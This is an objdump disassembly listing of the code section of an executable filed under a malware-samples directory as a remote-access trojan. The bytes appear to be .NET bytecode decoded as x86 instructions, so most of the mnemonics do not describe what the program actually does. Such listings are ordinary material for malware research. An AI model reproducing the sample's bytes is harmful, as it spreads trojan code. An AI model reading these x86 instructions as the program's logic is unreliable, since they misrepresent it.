
malware_samples/rat/3fb78e690343e65edeab13e283613cd0237c8ec01228bb408b75a5f2643f709c.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	f9                   	stc
  402001:	81 00 00 00 00 00    	addl   $0x0,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 80 43 00       	add    $0x438000,%eax
  402013:	00 d0                	add    %dl,%al
  402015:	3d 00 00 03 00       	cmp    $0x30000,%eax
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	1b 30                	sbb    (%eax),%esi
  402052:	02 00                	add    (%eax),%al
  402054:	e2 00                	loop   0x402056
  402056:	00 00                	add    %al,(%eax)
  402058:	01 00                	add    %eax,(%eax)
  40205a:	00 11                	add    %dl,(%ecx)
  40205c:	00 16                	add    %dl,(%esi)
  40205e:	0a 2b                	or     (%ebx),%ch
  402060:	11 00                	adc    %eax,(%eax)
  402062:	20 e8                	and    %ch,%al
  402064:	03 00                	add    (%eax),%eax
  402066:	00 28                	add    %ch,(%eax)
  402068:	10 00                	adc    %al,(%eax)
  40206a:	00 0a                	add    %cl,(%edx)
  40206c:	00 00                	add    %al,(%eax)
  40206e:	06                   	push   %es
  40206f:	17                   	pop    %ss
  402070:	58                   	pop    %eax
  402071:	0a 06                	or     (%esi),%al
  402073:	7e 11                	jle    0x402086
  402075:	00 00                	add    %al,(%eax)
  402077:	04 28                	add    $0x28,%al
  402079:	11 00                	adc    %eax,(%eax)
  40207b:	00 0a                	add    %cl,(%edx)
  40207d:	fe 04 0b             	incb   (%ebx,%ecx,1)
  402080:	07                   	pop    %es
  402081:	2d de 28 03 00       	sub    $0x328de,%eax
  402086:	00 06                	add    %al,(%esi)
  402088:	16                   	push   %ss
  402089:	fe 01                	incb   (%ecx)
  40208b:	0c 08                	or     $0x8,%al
  40208d:	2c 07                	sub    $0x7,%al
  40208f:	16                   	push   %ss
  402090:	28 12                	sub    %dl,(%edx)
  402092:	00 00                	add    %al,(%eax)
  402094:	0a 00                	or     (%eax),%al
  402096:	00 00                	add    %al,(%eax)
  402098:	28 37                	sub    %dh,(%edi)
  40209a:	00 00                	add    %al,(%eax)
  40209c:	06                   	push   %es
  40209d:	16                   	push   %ss
  40209e:	fe 01                	incb   (%ecx)
  4020a0:	0d 09 2c 07 16       	or     $0x16072c09,%eax
  4020a5:	28 12                	sub    %dl,(%edx)
  4020a7:	00 00                	add    %al,(%eax)
  4020a9:	0a 00                	or     (%eax),%al
  4020ab:	7e 0c                	jle    0x4020b9
  4020ad:	00 00                	add    %al,(%eax)
  4020af:	04 28                	add    $0x28,%al
  4020b1:	13 00                	adc    (%eax),%eax
  4020b3:	00 0a                	add    %cl,(%edx)
  4020b5:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4020b8:	04 2c                	add    $0x2c,%al
  4020ba:	06                   	push   %es
  4020bb:	28 27                	sub    %ah,(%edi)
  4020bd:	00 00                	add    %al,(%eax)
  4020bf:	06                   	push   %es
  4020c0:	00 7e 04             	add    %bh,0x4(%esi)
  4020c3:	00 00                	add    %al,(%eax)
  4020c5:	04 28                	add    $0x28,%al
  4020c7:	13 00                	adc    (%eax),%eax
  4020c9:	00 0a                	add    %cl,(%edx)
  4020cb:	13 05 11 05 2c 06    	adc    0x62c0511,%eax
  4020d1:	28 25 00 00 06 00    	sub    %ah,0x60000
  4020d7:	7e 0f                	jle    0x4020e8
  4020d9:	00 00                	add    %al,(%eax)
  4020db:	04 28                	add    $0x28,%al
  4020dd:	13 00                	adc    (%eax),%eax
  4020df:	00 0a                	add    %cl,(%edx)
  4020e1:	2c 07                	sub    $0x7,%al
  4020e3:	28 31                	sub    %dh,(%ecx)
  4020e5:	00 00                	add    %al,(%eax)
  4020e7:	06                   	push   %es
  4020e8:	2b 01                	sub    (%ecx),%eax
  4020ea:	16                   	push   %ss
  4020eb:	13 06                	adc    (%esi),%eax
  4020ed:	11 06                	adc    %eax,(%esi)
  4020ef:	2c 06                	sub    $0x6,%al
  4020f1:	28 40 00             	sub    %al,0x0(%eax)
  4020f4:	00 06                	add    %al,(%esi)
  4020f6:	00 28                	add    %ch,(%eax)
  4020f8:	35 00 00 06 00       	xor    $0x60000,%eax
  4020fd:	00 de                	add    %bl,%dh
  4020ff:	05 26 00 00 de       	add    $0xde000026,%eax
  402104:	00 2b                	add    %ch,(%ebx)
  402106:	32 00                	xor    (%eax),%al
  402108:	00 28                	add    %ch,(%eax)
  40210a:	12 00                	adc    (%eax),%al
  40210c:	00 06                	add    %al,(%esi)
  40210e:	16                   	push   %ss
  40210f:	fe 01                	incb   (%ecx)
  402111:	13 07                	adc    (%edi),%eax
  402113:	11 07                	adc    %eax,(%edi)
  402115:	2c 0e                	sub    $0xe,%al
  402117:	00 28                	add    %ch,(%eax)
  402119:	1f                   	pop    %ds
  40211a:	00 00                	add    %al,(%eax)
  40211c:	06                   	push   %es
  40211d:	00 28                	add    %ch,(%eax)
  40211f:	1b 00                	sbb    (%eax),%eax
  402121:	00 06                	add    %al,(%esi)
  402123:	00 00                	add    %al,(%eax)
  402125:	00 de                	add    %bl,%dh
  402127:	05 26 00 00 de       	add    $0xde000026,%eax
  40212c:	00 20                	add    %ah,(%eax)
  40212e:	88 13                	mov    %dl,(%ebx)
  402130:	00 00                	add    %al,(%eax)
  402132:	28 10                	sub    %dl,(%eax)
  402134:	00 00                	add    %al,(%eax)
  402136:	0a 00                	or     (%eax),%al
  402138:	00 17                	add    %dl,(%edi)
  40213a:	13 08                	adc    (%eax),%ecx
  40213c:	2b c9                	sub    %ecx,%ecx
  40213e:	00 00                	add    %al,(%eax)
  402140:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  402143:	00 00                	add    %al,(%eax)
  402145:	00 3b                	add    %bh,(%ebx)
  402147:	00 69 a4             	add    %ch,-0x5c(%ecx)
  40214a:	00 05 0f 00 00 01    	add    %al,0x100000f
  402150:	00 00                	add    %al,(%eax)
  402152:	ac                   	lods   %ds:(%esi),%al
  402153:	00 20                	add    %ah,(%eax)
  402155:	cc                   	int3
  402156:	00 05 0f 00 00 01    	add    %al,0x100000f
  40215c:	22 02                	and    (%edx),%al
  40215e:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402161:	00 0a                	add    %cl,(%edx)
  402163:	00 2a                	add    %ch,(%edx)
  402165:	00 00                	add    %al,(%eax)
  402167:	00 13                	add    %dl,(%ebx)
  402169:	30 02                	xor    %al,(%edx)
  40216b:	00 07                	add    %al,(%edi)
  40216d:	00 00                	add    %al,(%eax)
  40216f:	00 02                	add    %al,(%edx)
  402171:	00 00                	add    %al,(%eax)
  402173:	11 00                	adc    %eax,(%eax)
  402175:	17                   	pop    %ss
  402176:	0a 2b                	or     (%ebx),%ch
  402178:	00 06                	add    %al,(%esi)
  40217a:	2a 00                	sub    (%eax),%al
  40217c:	1b 30                	sbb    (%eax),%esi
  40217e:	04 00                	add    $0x0,%al
  402180:	50                   	push   %eax
  402181:	00 00                	add    %al,(%eax)
  402183:	00 03                	add    %al,(%ebx)
  402185:	00 00                	add    %al,(%eax)
  402187:	11 00                	adc    %eax,(%eax)
  402189:	00 7e 0b             	add    %bh,0xb(%esi)
  40218c:	00 00                	add    %al,(%eax)
  40218e:	04 6f                	add    $0x6f,%al
  402190:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402195:	16                   	push   %ss
  402196:	00 00                	add    %al,(%eax)
  402198:	0a 74 11 00          	or     0x0(%ecx,%edx,1),%dh
  40219c:	00 01                	add    %al,(%ecx)
  40219e:	0a 06                	or     (%esi),%al
  4021a0:	28 17                	sub    %dl,(%edi)
  4021a2:	00 00                	add    %al,(%eax)
  4021a4:	0a 7e 07             	or     0x7(%esi),%bh
  4021a7:	00 00                	add    %al,(%eax)
  4021a9:	04 6f                	add    $0x6f,%al
  4021ab:	18 00                	sbb    %al,(%eax)
  4021ad:	00 0a                	add    %cl,(%edx)
  4021af:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  4021b3:	06                   	push   %es
  4021b4:	72 01                	jb     0x4021b7
  4021b6:	00 00                	add    %al,(%eax)
  4021b8:	70 28                	jo     0x4021e2
  4021ba:	19 00                	sbb    %eax,(%eax)
  4021bc:	00 0a                	add    %cl,(%edx)
  4021be:	7e 0a                	jle    0x4021ca
  4021c0:	00 00                	add    %al,(%eax)
  4021c2:	04 28                	add    $0x28,%al
  4021c4:	1a 00                	sbb    (%eax),%al
  4021c6:	00 0a                	add    %cl,(%edx)
  4021c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4021c9:	1b 00                	sbb    (%eax),%eax
  4021cb:	00 0a                	add    %cl,(%edx)
  4021cd:	0b de                	or     %esi,%ebx
  4021cf:	06                   	push   %es
  4021d0:	26 00 16             	add    %dl,%es:(%esi)
  4021d3:	0b de                	or     %esi,%ebx
  4021d5:	00 07                	add    %al,(%edi)
  4021d7:	2a 01                	sub    (%ecx),%al
  4021d9:	10 00                	adc    %al,(%eax)
  4021db:	00 00                	add    %al,(%eax)
  4021dd:	00 01                	add    %al,(%ecx)
  4021df:	00 47 48             	add    %al,0x48(%edi)
  4021e2:	00 06                	add    %al,(%esi)
  4021e4:	12 00                	adc    (%eax),%al
  4021e6:	00 01                	add    %al,(%ecx)
  4021e8:	13 30                	adc    (%eax),%esi
  4021ea:	01 00                	add    %eax,(%eax)
  4021ec:	b0 00                	mov    $0x0,%al
  4021ee:	00 00                	add    %al,(%eax)
  4021f0:	00 00                	add    %al,(%eax)
  4021f2:	00 00                	add    %al,(%eax)
  4021f4:	72 0f                	jb     0x402205
  4021f6:	00 00                	add    %al,(%eax)
  4021f8:	70 80                	jo     0x40217a
  4021fa:	01 00                	add    %eax,(%eax)
  4021fc:	00 04 72             	add    %al,(%edx,%esi,2)
  4021ff:	17                   	pop    %ss
  402200:	00 00                	add    %al,(%eax)
  402202:	70 80                	jo     0x402184
  402204:	02 00                	add    (%eax),%al
  402206:	00 04 72             	add    %al,(%edx,%esi,2)
  402209:	39 00                	cmp    %eax,(%eax)
  40220b:	00 70 80             	add    %dh,-0x80(%eax)
  40220e:	03 00                	add    (%eax),%eax
  402210:	00 04 72             	add    %al,(%edx,%esi,2)
  402213:	47                   	inc    %edi
  402214:	00 00                	add    %al,(%eax)
  402216:	70 80                	jo     0x402198
  402218:	04 00                	add    $0x0,%al
  40221a:	00 04 72             	add    %al,(%edx,%esi,2)
  40221d:	53                   	push   %ebx
  40221e:	00 00                	add    %al,(%eax)
  402220:	70 80                	jo     0x4021a2
  402222:	05 00 00 04 72       	add    $0x72040000,%eax
  402227:	63 00                	arpl   %eax,(%eax)
  402229:	00 70 80             	add    %dh,-0x80(%eax)
  40222c:	06                   	push   %es
  40222d:	00 00                	add    %al,(%eax)
  40222f:	04 72                	add    $0x72,%al
  402231:	7b 00                	jnp    0x402233
  402233:	00 70 80             	add    %dh,-0x80(%eax)
  402236:	07                   	pop    %es
  402237:	00 00                	add    %al,(%eax)
  402239:	04 72                	add    $0x72,%al
  40223b:	d5 00                	aad    $0x0
  40223d:	00 70 80             	add    %dh,-0x80(%eax)
  402240:	08 00                	or     %al,(%eax)
  402242:	00 04 72             	add    %al,(%edx,%esi,2)
  402245:	e1 00                	loope  0x402247
  402247:	00 70 80             	add    %dh,-0x80(%eax)
  40224a:	09 00                	or     %eax,(%eax)
  40224c:	00 04 72             	add    %al,(%edx,%esi,2)
  40224f:	fd                   	std
  402250:	00 00                	add    %al,(%eax)
  402252:	70 80                	jo     0x4021d4
  402254:	0a 00                	or     (%eax),%al
  402256:	00 04 72             	add    %al,(%edx,%esi,2)
  402259:	47                   	inc    %edi
  40225a:	00 00                	add    %al,(%eax)
  40225c:	70 80                	jo     0x4021de
  40225e:	0c 00                	or     $0x0,%al
  402260:	00 04 7e             	add    %al,(%esi,%edi,2)
  402263:	07                   	pop    %es
  402264:	00 00                	add    %al,(%eax)
  402266:	04 73                	add    $0x73,%al
  402268:	4c                   	dec    %esp
  402269:	00 00                	add    %al,(%eax)
  40226b:	06                   	push   %es
  40226c:	80 0d 00 00 04 72 21 	orb    $0x21,0x72040000
  402273:	01 00                	add    %eax,(%eax)
  402275:	70 80                	jo     0x4021f7
  402277:	0e                   	push   %cs
  402278:	00 00                	add    %al,(%eax)
  40227a:	04 72                	add    $0x72,%al
  40227c:	47                   	inc    %edi
  40227d:	00 00                	add    %al,(%eax)
  40227f:	70 80                	jo     0x402201
  402281:	0f 00 00             	sldt   (%eax)
  402284:	04 28                	add    $0x28,%al
  402286:	2e 00 00             	add    %al,%cs:(%eax)
  402289:	06                   	push   %es
  40228a:	80 10 00             	adcb   $0x0,(%eax)
  40228d:	00 04 72             	add    %al,(%edx,%esi,2)
  402290:	2b 01                	sub    (%ecx),%eax
  402292:	00 70 80             	add    %dh,-0x80(%eax)
  402295:	11 00                	adc    %eax,(%eax)
  402297:	00 04 72             	add    %al,(%edx,%esi,2)
  40229a:	2f                   	das
  40229b:	01 00                	add    %eax,(%eax)
  40229d:	70 80                	jo     0x40221f
  40229f:	12 00                	adc    (%eax),%al
  4022a1:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4022a4:	1a 7e 13             	sbb    0x13(%esi),%bh
  4022a7:	00 00                	add    %al,(%eax)
  4022a9:	04 2a                	add    $0x2a,%al
  4022ab:	1e                   	push   %ds
  4022ac:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  4022b2:	2a 1a                	sub    (%edx),%bl
  4022b4:	7e 14                	jle    0x4022ca
  4022b6:	00 00                	add    %al,(%eax)
  4022b8:	04 2a                	add    $0x2a,%al
  4022ba:	1e                   	push   %ds
  4022bb:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  4022c1:	2a 1a                	sub    (%edx),%bl
  4022c3:	7e 15                	jle    0x4022da
  4022c5:	00 00                	add    %al,(%eax)
  4022c7:	04 2a                	add    $0x2a,%al
  4022c9:	1e                   	push   %ds
  4022ca:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4022d0:	2a 1a                	sub    (%edx),%bl
  4022d2:	7e 16                	jle    0x4022ea
  4022d4:	00 00                	add    %al,(%eax)
  4022d6:	04 2a                	add    $0x2a,%al
  4022d8:	1e                   	push   %ds
  4022d9:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4022df:	2a 1a                	sub    (%edx),%bl
  4022e1:	7e 17                	jle    0x4022fa
  4022e3:	00 00                	add    %al,(%eax)
  4022e5:	04 2a                	add    $0x2a,%al
  4022e7:	1e                   	push   %ds
  4022e8:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4022ee:	2a 1a                	sub    (%edx),%bl
  4022f0:	7e 18                	jle    0x40230a
  4022f2:	00 00                	add    %al,(%eax)
  4022f4:	04 2a                	add    $0x2a,%al
  4022f6:	1e                   	push   %ds
  4022f7:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4022fd:	2a 1a                	sub    (%edx),%bl
  4022ff:	7e 19                	jle    0x40231a
  402301:	00 00                	add    %al,(%eax)
  402303:	04 2a                	add    $0x2a,%al
  402305:	1e                   	push   %ds
  402306:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  40230c:	2a 1a                	sub    (%edx),%bl
  40230e:	7e 1a                	jle    0x40232a
  402310:	00 00                	add    %al,(%eax)
  402312:	04 2a                	add    $0x2a,%al
  402314:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  402317:	00 00                	add    %al,(%eax)
  402319:	04 2a                	add    $0x2a,%al
  40231b:	1e                   	push   %ds
  40231c:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  402322:	2a 1a                	sub    (%edx),%bl
  402324:	7e 1c                	jle    0x402342
  402326:	00 00                	add    %al,(%eax)
  402328:	04 2a                	add    $0x2a,%al
  40232a:	1e                   	push   %ds
  40232b:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  402331:	2a 1a                	sub    (%edx),%bl
  402333:	7e 1d                	jle    0x402352
  402335:	00 00                	add    %al,(%eax)
  402337:	04 2a                	add    $0x2a,%al
  402339:	1e                   	push   %ds
  40233a:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  402340:	2a 00                	sub    (%eax),%al
  402342:	00 00                	add    %al,(%eax)
  402344:	1b 30                	sbb    (%eax),%esi
  402346:	07                   	pop    %es
  402347:	00 46 03             	add    %al,0x3(%esi)
  40234a:	00 00                	add    %al,(%eax)
  40234c:	04 00                	add    $0x0,%al
  40234e:	00 11                	add    %dl,(%ecx)
  402350:	00 00                	add    %al,(%eax)
  402352:	18 17                	sbb    %dl,(%edi)
  402354:	1c 73                	sbb    $0x73,%al
  402356:	1c 00                	sbb    $0x0,%al
  402358:	00 0a                	add    %cl,(%edx)
  40235a:	25 20 00 c8 00       	and    $0xc80020,%eax
  40235f:	00 6f 1d             	add    %ch,0x1d(%edi)
  402362:	00 00                	add    %al,(%eax)
  402364:	0a 00                	or     (%eax),%al
  402366:	25 20 00 c8 00       	and    $0xc80020,%eax
  40236b:	00 6f 1e             	add    %ch,0x1e(%edi)
  40236e:	00 00                	add    %al,(%eax)
  402370:	0a 00                	or     (%eax),%al
  402372:	28 07                	sub    %al,(%edi)
  402374:	00 00                	add    %al,(%eax)
  402376:	06                   	push   %es
  402377:	00 7e 0e             	add    %bh,0xe(%esi)
  40237a:	00 00                	add    %al,(%eax)
  40237c:	04 72                	add    $0x72,%al
  40237e:	21 01                	and    %eax,(%ecx)
  402380:	00 70 28             	add    %dh,0x28(%eax)
  402383:	1f                   	pop    %ds
  402384:	00 00                	add    %al,(%eax)
  402386:	0a 0a                	or     (%edx),%cl
  402388:	06                   	push   %es
  402389:	39 eb                	cmp    %ebp,%ebx
  40238b:	00 00                	add    %al,(%eax)
  40238d:	00 00                	add    %al,(%eax)
  40238f:	7e 02                	jle    0x402393
  402391:	00 00                	add    %al,(%eax)
  402393:	04 17                	add    $0x17,%al
  402395:	8d 4c 00 00          	lea    0x0(%eax,%eax,1),%ecx
  402399:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  40239f:	6f                   	outsl  %ds:(%esi),(%dx)
  4023a0:	20 00                	and    %al,(%eax)
  4023a2:	00 0a                	add    %cl,(%edx)
  4023a4:	73 21                	jae    0x4023c7
  4023a6:	00 00                	add    %al,(%eax)
  4023a8:	0a 7e 02             	or     0x2(%esi),%bh
  4023ab:	00 00                	add    %al,(%eax)
  4023ad:	04 17                	add    $0x17,%al
  4023af:	8d 4c 00 00          	lea    0x0(%eax,%eax,1),%ecx
  4023b3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4023b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4023ba:	20 00                	and    %al,(%eax)
  4023bc:	00 0a                	add    %cl,(%edx)
  4023be:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4023c1:	22 00                	and    (%eax),%al
  4023c3:	00 0a                	add    %cl,(%edx)
  4023c5:	9a 0b 7e 01 00 00 04 	lcall  $0x400,$0x17e0b
  4023cc:	17                   	pop    %ss
  4023cd:	8d 4c 00 00          	lea    0x0(%eax,%eax,1),%ecx
  4023d1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4023d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d8:	20 00                	and    %al,(%eax)
  4023da:	00 0a                	add    %cl,(%edx)
  4023dc:	73 21                	jae    0x4023ff
  4023de:	00 00                	add    %al,(%eax)
  4023e0:	0a 7e 01             	or     0x1(%esi),%bh
  4023e3:	00 00                	add    %al,(%eax)
  4023e5:	04 17                	add    $0x17,%al
  4023e7:	8d 4c 00 00          	lea    0x0(%eax,%eax,1),%ecx
  4023eb:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4023f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4023f2:	20 00                	and    %al,(%eax)
  4023f4:	00 0a                	add    %cl,(%edx)
  4023f6:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4023f9:	22 00                	and    (%eax),%al
  4023fb:	00 0a                	add    %cl,(%edx)
  4023fd:	9a 28 11 00 00 0a 0c 	lcall  $0xc0a,$0x1128
  402404:	07                   	pop    %es
  402405:	28 1d 00 00 06 0d    	sub    %bl,0xd060000
  40240b:	09 2c 56             	or     %ebp,(%esi,%edx,2)
  40240e:	00 07                	add    %al,(%edi)
  402410:	28 23                	sub    %ah,(%ebx)
  402412:	00 00                	add    %al,(%eax)
  402414:	0a 13                	or     (%ebx),%dl
  402416:	04 00                	add    $0x0,%al
  402418:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40241b:	05 16 13 06 2b       	add    $0x2b061316,%eax
  402420:	38 11                	cmp    %dl,(%ecx)
  402422:	05 11 06 9a 13       	add    $0x139a0611,%eax
  402427:	07                   	pop    %es
  402428:	00 00                	add    %al,(%eax)
  40242a:	28 06                	sub    %al,(%esi)
  40242c:	00 00                	add    %al,(%eax)
  40242e:	06                   	push   %es
  40242f:	11 07                	adc    %eax,(%edi)
  402431:	08 6f 24             	or     %ch,0x24(%edi)
  402434:	00 00                	add    %al,(%eax)
  402436:	0a 00                	or     (%eax),%al
  402438:	28 06                	sub    %al,(%esi)
  40243a:	00 00                	add    %al,(%eax)
  40243c:	06                   	push   %es
  40243d:	6f                   	outsl  %ds:(%esi),(%dx)
  40243e:	25 00 00 0a 13       	and    $0x130a0000,%eax
  402443:	08 11                	or     %dl,(%ecx)
  402445:	08 2c 02             	or     %ch,(%edx,%eax,1)
  402448:	de 17                	ficoms (%edi)
  40244a:	00 de                	add    %bl,%dh
  40244c:	05 26 00 00 de       	add    $0xde000026,%eax
  402451:	00 00                	add    %al,(%eax)
  402453:	11 06                	adc    %eax,(%esi)
  402455:	17                   	pop    %ss
  402456:	58                   	pop    %eax
  402457:	13 06                	adc    (%esi),%eax
  402459:	11 06                	adc    %eax,(%esi)
  40245b:	11 05 8e 69 32 c0    	adc    %eax,0xc032698e
  402461:	00 2b                	add    %ch,(%ebx)
  402463:	0f 00 28             	verw   (%eax)
  402466:	06                   	push   %es
  402467:	00 00                	add    %al,(%eax)
  402469:	06                   	push   %es
  40246a:	07                   	pop    %es
  40246b:	08 6f 26             	or     %ch,0x26(%edi)
  40246e:	00 00                	add    %al,(%eax)
  402470:	0a 00                	or     (%eax),%al
  402472:	00 00                	add    %al,(%eax)
  402474:	38 95 00 00 00 00    	cmp    %dl,0x0(%ebp)
  40247a:	73 27                	jae    0x4024a3
  40247c:	00 00                	add    %al,(%eax)
  40247e:	0a 13                	or     (%ebx),%dl
  402480:	09 00                	or     %eax,(%eax)
  402482:	72 3b                	jb     0x4024bf
  402484:	01 00                	add    %eax,(%eax)
  402486:	70 72                	jo     0x4024fa
  402488:	3b 01                	cmp    (%ecx),%eax
  40248a:	00 70 73             	add    %dh,0x73(%eax)
  40248d:	28 00                	sub    %al,(%eax)
  40248f:	00 0a                	add    %cl,(%edx)
  402491:	13 0a                	adc    (%edx),%ecx
  402493:	11 09                	adc    %ecx,(%ecx)
  402495:	11 0a                	adc    %ecx,(%edx)
  402497:	6f                   	outsl  %ds:(%esi),(%dx)
  402498:	29 00                	sub    %eax,(%eax)
  40249a:	00 0a                	add    %cl,(%edx)
  40249c:	00 11                	add    %dl,(%ecx)
  40249e:	09 7e 0e             	or     %edi,0xe(%esi)
  4024a1:	00 00                	add    %al,(%eax)
  4024a3:	04 6f                	add    $0x6f,%al
  4024a5:	2a 00                	sub    (%eax),%al
  4024a7:	00 0a                	add    %cl,(%edx)
  4024a9:	13 0b                	adc    (%ebx),%ecx
  4024ab:	11 0b                	adc    %ecx,(%ebx)
  4024ad:	17                   	pop    %ss
  4024ae:	8d 4b 00             	lea    0x0(%ebx),%ecx
  4024b1:	00 01                	add    %al,(%ecx)
  4024b3:	25 16 72 3d 01       	and    $0x13d7216,%eax
  4024b8:	00 70 a2             	add    %dh,-0x5e(%eax)
  4024bb:	16                   	push   %ss
  4024bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4024bd:	2b 00                	sub    (%eax),%eax
  4024bf:	00 0a                	add    %cl,(%edx)
  4024c1:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  4024c4:	0c 16                	or     $0x16,%al
  4024c6:	9a 80 02 00 00 04 11 	lcall  $0x1104,$0x280
  4024cd:	0c 73                	or     $0x73,%al
  4024cf:	21 00                	and    %eax,(%eax)
  4024d1:	00 0a                	add    %cl,(%edx)
  4024d3:	17                   	pop    %ss
  4024d4:	11 0c 8e             	adc    %ecx,(%esi,%ecx,4)
  4024d7:	69 6f 2c 00 00 0a 9a 	imul   $0x9a0a0000,0x2c(%edi),%ebp
  4024de:	80 01 00             	addb   $0x0,(%ecx)
  4024e1:	00 04 28             	add    %al,(%eax,%ebp,1)
  4024e4:	06                   	push   %es
  4024e5:	00 00                	add    %al,(%eax)
  4024e7:	06                   	push   %es
  4024e8:	7e 02                	jle    0x4024ec
  4024ea:	00 00                	add    %al,(%eax)
  4024ec:	04 7e                	add    $0x7e,%al
  4024ee:	01 00                	add    %eax,(%eax)
  4024f0:	00 04 28             	add    %al,(%eax,%ebp,1)
  4024f3:	11 00                	adc    %eax,(%eax)
  4024f5:	00 0a                	add    %cl,(%edx)
  4024f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4024f8:	26 00 00             	add    %al,%es:(%eax)
  4024fb:	0a 00                	or     (%eax),%al
  4024fd:	00 de                	add    %bl,%dh
  4024ff:	0d 11 09 2c 08       	or     $0x82c0911,%eax
  402504:	11 09                	adc    %ecx,(%ecx)
  402506:	6f                   	outsl  %ds:(%esi),(%dx)
  402507:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40250c:	dc 00                	faddl  (%eax)
  40250e:	28 06                	sub    %al,(%esi)
  402510:	00 00                	add    %al,(%eax)
  402512:	06                   	push   %es
  402513:	6f                   	outsl  %ds:(%esi),(%dx)
  402514:	25 00 00 0a 13       	and    $0x130a0000,%eax
  402519:	0d 11 0d 39 51       	or     $0x51390d11,%eax
  40251e:	01 00                	add    %eax,(%eax)
  402520:	00 00                	add    %al,(%eax)
  402522:	72 41                	jb     0x402565
  402524:	01 00                	add    %eax,(%eax)
  402526:	70 28                	jo     0x402550
  402528:	2e 00 00             	add    %al,%cs:(%eax)
  40252b:	0a 00                	or     (%eax),%al
  40252d:	17                   	pop    %ss
  40252e:	28 13                	sub    %dl,(%ebx)
  402530:	00 00                	add    %al,(%eax)
  402532:	06                   	push   %es
  402533:	00 28                	add    %ch,(%eax)
  402535:	06                   	push   %es
  402536:	00 00                	add    %al,(%eax)
  402538:	06                   	push   %es
  402539:	17                   	pop    %ss
  40253a:	73 2f                	jae    0x40256b
  40253c:	00 00                	add    %al,(%eax)
  40253e:	0a 16                	or     (%esi),%dl
  402540:	14 fe                	adc    $0xfe,%al
  402542:	06                   	push   %es
  402543:	1e                   	push   %ds
  402544:	00 00                	add    %al,(%eax)
  402546:	06                   	push   %es
  402547:	73 30                	jae    0x402579
  402549:	00 00                	add    %al,(%eax)
  40254b:	0a 73 31             	or     0x31(%ebx),%dh
  40254e:	00 00                	add    %al,(%eax)
  402550:	0a 28                	or     (%eax),%ch
  402552:	09 00                	or     %eax,(%eax)
  402554:	00 06                	add    %al,(%esi)
  402556:	00 28                	add    %ch,(%eax)
  402558:	08 00                	or     %al,(%eax)
  40255a:	00 06                	add    %al,(%esi)
  40255c:	28 06                	sub    %al,(%esi)
  40255e:	00 00                	add    %al,(%eax)
  402560:	06                   	push   %es
  402561:	6f                   	outsl  %ds:(%esi),(%dx)
  402562:	32 00                	xor    (%eax),%al
  402564:	00 0a                	add    %cl,(%edx)
  402566:	6f                   	outsl  %ds:(%esi),(%dx)
  402567:	33 00                	xor    (%eax),%eax
  402569:	00 0a                	add    %cl,(%edx)
  40256b:	17                   	pop    %ss
  40256c:	8d 4c 00 00          	lea    0x0(%eax,%eax,1),%ecx
  402570:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402576:	6f                   	outsl  %ds:(%esi),(%dx)
  402577:	20 00                	and    %al,(%eax)
  402579:	00 0a                	add    %cl,(%edx)
  40257b:	16                   	push   %ss
  40257c:	9a 14 20 c0 00 00 00 	lcall  $0x0,$0xc02014
  402583:	16                   	push   %ss
  402584:	6f                   	outsl  %ds:(%esi),(%dx)
  402585:	34 00                	xor    $0x0,%al
  402587:	00 0a                	add    %cl,(%edx)
  402589:	00 14 28             	add    %dl,(%eax,%ebp,1)
  40258c:	22 00                	and    (%eax),%al
  40258e:	00 06                	add    %al,(%esi)
  402590:	00 1a                	add    %bl,(%edx)
  402592:	6a 28                	push   $0x28
  402594:	0d 00 00 06 00       	or     $0x60000,%eax
  402599:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  40259c:	00 06                	add    %al,(%esi)
  40259e:	d4 8d                	aam    $0x8d
  4025a0:	59                   	pop    %ecx
  4025a1:	00 00                	add    %al,(%eax)
  4025a3:	01 28                	add    %ebp,(%eax)
  4025a5:	0b 00                	or     (%eax),%eax
  4025a7:	00 06                	add    %al,(%esi)
  4025a9:	00 16                	add    %dl,(%esi)
  4025ab:	6a 28                	push   $0x28
  4025ad:	0f 00 00             	sldt   (%eax)
  4025b0:	06                   	push   %es
  4025b1:	00 28                	add    %ch,(%eax)
  4025b3:	30 00                	xor    %al,(%eax)
  4025b5:	00 06                	add    %al,(%esi)
  4025b7:	28 21                	sub    %ah,(%ecx)
  4025b9:	00 00                	add    %al,(%eax)
  4025bb:	06                   	push   %es
  4025bc:	00 16                	add    %dl,(%esi)
  4025be:	28 18                	sub    %bl,(%eax)
